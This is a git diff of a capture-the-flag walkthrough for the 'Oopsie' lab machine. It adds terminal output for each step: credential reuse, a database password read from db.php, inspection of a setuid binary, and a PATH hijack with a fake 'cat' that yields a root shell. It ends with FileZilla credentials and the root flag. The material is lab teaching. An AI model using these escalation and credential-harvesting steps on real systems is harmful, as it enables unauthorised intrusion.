@@ -305,7 +305,7 @@ The URL /cdn-cgi/login seems interesting, let's examine this in the browser.
 
 ![image-20210308201426428](images\image-20210308201426428.png)
 
-We confirm that this is a login page. Let's try to reuse the password MEGACORP_4dm1n!! from the previously compromised machine, with common usernames such as administrator or admin .
+We confirm that this is a login page. Let's try to reuse the password **MEGACORP_4dm1n!!** from the previously compromised machine, with common usernames such as administrator or admin .
 
 This is successful, and we gain access to the web portal, which contains additional functionality.
 
@@ -398,6 +398,17 @@ The website records are probably retrieved from a database, so it's a good idea 
 
 ![image-20210308212306698](images\image-20210308212306698.png)
 
+```
+www-data@oopsie:/$ ls /var/www/html/cdn-cgi/login
+ls /var/www/html/cdn-cgi/login
+admin.php  db.php  index.php  script.js
+www-data@oopsie:/$ cat /var/www/html/cdn-cgi/login/db.php
+cat /var/www/html/cdn-cgi/login/db.php
+<?php
+$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
+?>
+```
+
 
 
 ### Privilege Escalation
@@ -406,13 +417,155 @@ The id command reveals that robert is a member of the bugracker group. We can en
 
 ![image-20210308212342372](images\image-20210308212342372.png)
 
+```
+www-data@oopsie:/$ find / -type f -group bugtracker 2>/dev/null
+find / -type f -group bugtracker 2>/dev/null
+/usr/bin/bugtracker
+www-data@oopsie:/$ ls -al /usr/bin/bugtracker
+ls -al /usr/bin/bugtracker
+-rwsr-xr-- 1 root bugtracker 8792 Jan 25  2020 /usr/bin/bugtracker
+```
+
+
+
 There is a bugtracker binary, and the setuid but is set. Let's run it and see what it does.
 
 ![image-20210308212422530](images\image-20210308212422530.png)
 
+```
+robert@oopsie:~$ /usr/bin/bugtracker
+
+------------------
+: EV Bug Tracker :
+------------------
+
+Provide Bug ID: 1
+---------------
+
+Binary package hint: ev-engine-lib
+
+Version: 3.3.3-1
+
+Reproduce:
+When loading library in firmware it seems to be crashed
+
+What you expected to happen:
+Synchronized browsing to be enabled since it is enabled for that site.
+
+What happened instead:
+Synchronized browsing is disabled. Even choosing VIEW > SYNCHRONIZED BROWSING from menu does not stay enabled between connects.
+
+```
+
+
+
 It seems to output a report based on the ID value provided. Let's use strings to see how it does this.
 
 ![image-20210308212451556](images\image-20210308212451556.png)
+
+```
+robert@oopsie:~$ strings /usr/bin/bugtracker
+/lib64/ld-linux-x86-64.so.2
+libc.so.6
+setuid
+strcpy
+__isoc99_scanf
+__stack_chk_fail
+putchar
+printf
+strlen
+malloc
+strcat
+system
+geteuid
+__cxa_finalize
+__libc_start_main
+GLIBC_2.7
+GLIBC_2.4
+GLIBC_2.2.5
+_ITM_deregisterTMCloneTable
+__gmon_start__
+_ITM_registerTMCloneTable
+AWAVI
+AUATL
+[]A\A]A^A_
+------------------
+: EV Bug Tracker :
+------------------
+Provide Bug ID: 
+---------------
+cat /root/reports/
+;*3$"
+GCC: (Ubuntu 7.4.0-1ubuntu1~18.04.1) 7.4.0
+crtstuff.c
+deregister_tm_clones
+__do_global_dtors_aux
+completed.7697
+__do_global_dtors_aux_fini_array_entry
+frame_dummy
+__frame_dummy_init_array_entry
+test.c
+__FRAME_END__
+__init_array_end
+_DYNAMIC
+__init_array_start
+__GNU_EH_FRAME_HDR
+_GLOBAL_OFFSET_TABLE_
+__libc_csu_fini
+putchar@@GLIBC_2.2.5
+_ITM_deregisterTMCloneTable
+strcpy@@GLIBC_2.2.5
+_edata
+strlen@@GLIBC_2.2.5
+__stack_chk_fail@@GLIBC_2.4
+system@@GLIBC_2.2.5
+printf@@GLIBC_2.2.5
+concat
+geteuid@@GLIBC_2.2.5
+__libc_start_main@@GLIBC_2.2.5
+__data_start
+__gmon_start__
+__dso_handle
+_IO_stdin_used
+__libc_csu_init
+malloc@@GLIBC_2.2.5
+__bss_start
+main
+__isoc99_scanf@@GLIBC_2.7
+strcat@@GLIBC_2.2.5
+__TMC_END__
+_ITM_registerTMCloneTable
+setuid@@GLIBC_2.2.5
+__cxa_finalize@@GLIBC_2.2.5
+.symtab
+.strtab
+.shstrtab
+.interp
+.note.ABI-tag
+.note.gnu.build-id
+.gnu.hash
+.dynsym
+.dynstr
+.gnu.version
+.gnu.version_r
+.rela.dyn
+.rela.plt
+.init
+.plt.got
+.text
+.fini
+.rodata
+.eh_frame_hdr
+.eh_frame
+.init_array
+.fini_array
+.dynamic
+.data
+.bss
+.comment
+```
+
+
 
 We see that it calls the cat binary using this relative path instead of the absolute path. By creating a malicious cat, and modifying the path to include the current working directory, we should be able to abuse this misconfiguration, and escalate our privileges to root.
 
@@ -420,6 +573,84 @@ Let's add the current working directory to PATH, create the malicious binary and
 
 ![image-20210308212527373](images\image-20210308212527373.png)
 
+```
+robert@oopsie:~$ export PATH=/tmp:$PATH
+robert@oopsie:~$ cd /tmp
+robert@oopsie:/tmp$ echo '/bin/bash' > cat
+robert@oopsie:/tmp$ chmod +x cat 
+robert@oopsie:/tmp$ /usr/bin/bugtracker 
+
+------------------
+: EV Bug Tracker :
+------------------
+
+Provide Bug ID: 1
+---------------
+
+root@oopsie:/tmp# id
+uid=0(root) gid=1000(robert) groups=1000(robert),1001(bugtracker)
+root@oopsie:/tmp# 
+```
+
+
+
 ### Post Exploitation
 
 Inside root's folder, we see a .config folder, which contains a FileZilla config file with the credentials ftpuser / mc@F1l3ZilL4 visible in plain text.
+
+```
+oot@oopsie:/root# cd .config/
+root@oopsie:/root/.config# ls
+filezilla
+root@oopsie:/root/.config# cat filezilla/
+root@oopsie:/root/.config# cd filezilla/
+root@oopsie:/root/.config/filezilla# ls
+filezilla.xml
+root@oopsie:/root/.config/filezilla# vi filezilla.xml
+```
+
+```
+<?xml version="1.0" encoding="UTF-8" standalone="yes" ?>
+<FileZilla3>
+    <RecentServers>
+        <Server>
+            <Host>10.10.10.46</Host>
+            <Port>21</Port>
+            <Protocol>0</Protocol>
+            <Type>0</Type>
+            <User>ftpuser</User>
+            <Pass>mc@F1l3ZilL4</Pass>
+            <Logontype>1</Logontype>
+            <TimezoneOffset>0</TimezoneOffset>
+            <PasvMode>MODE_DEFAULT</PasvMode>
+            <MaximumMultipleConnections>0</MaximumMultipleConnections>
+            <EncodingType>Auto</EncodingType>
+            <BypassProxy>0</BypassProxy>
+        </Server>
+    </RecentServers>
+</FileZilla3>
+
+```
+
+### FLAG
+
+```
+root@oopsie:/tmp# cd /root/
+root@oopsie:/root# ls
+reports  root.txt
+oot@oopsie:/root# cat root.txt
+af13b0bee69f8a877c3faf667f7beacf
+```
+
+
+
+## Vaccine
+
+### Enumeration
+
+```
+# nmap -sC -sV 10.10.10.46
+```
+
+
+
